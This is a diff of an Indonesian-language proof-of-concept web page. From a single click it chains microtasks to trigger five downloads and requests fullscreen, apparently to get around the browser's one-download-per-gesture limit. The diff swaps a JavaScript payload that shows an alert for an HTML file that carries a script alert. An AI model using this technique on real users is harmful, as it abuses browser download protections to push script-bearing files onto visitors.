@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Blob ObjectURL — Race Condition JS</title>
+<title>Blob ObjectURL — Race Condition Download</title>
 <style>
 * {
 box-sizing: border-box;
@@ -105,9 +105,9 @@ word-break: break-all;
 <body>
 
 <div class="panel" id="main-panel">
-<h2>Blob ObjectURL — Race Condition .JS</h2>
-<p>Satu klik tombol = satu gesture user. Teknik race condition memanfaatkan microtask &amp; task scheduling agar browser menganggap semua unduhan berasal dari gesture yang sama, sehingga memicu lebih dari 1 unduhan berkas <code>.js</code> sekaligus.</p>
-<button id="start-btn" type="button">Mulai Layar Penuh &amp; Race Download .JS</button>
+<h2>Blob ObjectURL — Race Condition Download</h2>
+<p>Satu klik tombol = satu gesture user. Teknik race condition memanfaatkan microtask &amp; task scheduling agar browser menganggap semua unduhan berasal dari gesture yang sama, sehingga memicu lebih dari 1 unduhan sekaligus.</p>
+<button id="start-btn" type="button">Mulai Layar Penuh &amp; Race Download</button>
 <div id="status" role="status">Sistem siap.</div>
 <div id="counter">Unduhan dipicu: 0</div>
 <div id="downloads"></div>
@@ -132,29 +132,12 @@ window.speechSynthesis.speak(utterance);
 }
 };
 
-var payloadJs = "(function() {\n" +
-"    'use strict';\n" +
-"    var info = {\n" +
-"        origin: (typeof window !== 'undefined') ? (window.location.origin || 'null') : 'node',\n" +
-"        href: (typeof window !== 'undefined') ? window.location.href : 'node',\n" +
-"        waktu: new Date().toISOString(),\n" +
-"        ua: (typeof navigator !== 'undefined') ? navigator.userAgent : 'node'\n" +
-"    };\n" +
-"    console.log('[Payload JS] Aktif:', info);\n" +
-"    try {\n" +
-"        if (typeof alert !== 'undefined') {\n" +
-"            alert('Payload JS aktif! Origin: ' + info.origin);\n" +
-"        }\n" +
-"    } catch (e) {\n" +
-"        console.warn('alert diblokir:', e.message);\n" +
-"    }\n" +
-"    if (typeof window !== 'undefined') {\n" +
-"        window.__payloadInfo = info;\n" +
-"    }\n" +
-"})();\n";
+var payloadText = '<html><body><h1>Test Vulnerability</h1>' +
+'<script>alert("Origin: " + document.origin)<\/script>' +
+'</body></html>';
 
 function buatBlobUrl(id) {
-var blob = new Blob([payloadJs], { type: "application/javascript" });
+var blob = new Blob([payloadText], { type: "application/octet-stream" });
 var url = URL.createObjectURL(blob);
 activeUrls.push(url);
 return url;
@@ -163,9 +146,8 @@ return url;
 function triggerDownload(url, id, label) {
 var a = document.createElement("a");
 a.href = url;
-a.download = "race-script-" + String(id).padStart(3, '0') + ".js";
+a.download = "race-file-" + String(id).padStart(3, '0') + ".txt";
 a.textContent = label;
-a.style.display = "none";
 downloadsDiv.appendChild(a);
 a.click();
 }
@@ -183,7 +165,7 @@ activeUrls = [];
 downloadsDiv.replaceChildren();
 updateCounter(0);
 
-statusDiv.textContent = "Memicu race condition .JS...";
+statusDiv.textContent = "Memicu race condition...";
 
 var root = document.documentElement;
 try {
@@ -199,21 +181,18 @@ console.warn("Fullscreen gagal:", err);
 }
 
 var dipicu = 0;
-var target = 5;
 
 function picuSatu() {
-if (dipicu >= target) {
-statusDiv.textContent = "Selesai. " + dipicu + " berkas .JS dipicu dari 1 klik.";
+if (dipicu >= 5) {
+statusDiv.textContent = "Selesai. " + dipicu + " unduhan dipicu dari 1 klik.";
 isProcessing = false;
 startBtn.disabled = false;
-speak("Race condition selesai.");
 return;
 }
 dipicu++;
 var url = buatBlobUrl(dipicu);
-triggerDownload(url, dipicu, "Race .JS #" + dipicu);
+triggerDownload(url, dipicu, "Race #" + dipicu);
 updateCounter(dipicu);
-statusDiv.textContent = "Memproses .JS ke-" + dipicu + " dari " + target;
 queueMicrotask(picuSatu);
 }
 
@@ -227,7 +206,7 @@ picuSatu();
 startBtn.addEventListener("click", function() {
 if (isProcessing) return;
 startBtn.disabled = true;
-speak("Memulai race condition berkas js.");
+speak("Memulai race condition download.");
 jalankanRaceCondition();
 });
 
